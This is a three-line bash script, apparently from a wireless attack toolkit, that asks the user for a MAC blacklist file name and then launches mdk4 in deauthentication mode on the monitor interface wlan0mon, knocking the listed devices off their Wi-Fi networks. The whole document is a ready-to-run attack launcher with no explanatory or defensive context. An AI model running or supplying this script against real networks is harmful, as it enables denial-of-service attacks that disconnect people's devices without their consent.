#!/bin/bash
file=$(zenity --entry --text="file name to create for blacklist mac?")
xterm -hold -e "mdk4 wlan0mon d -b $file"
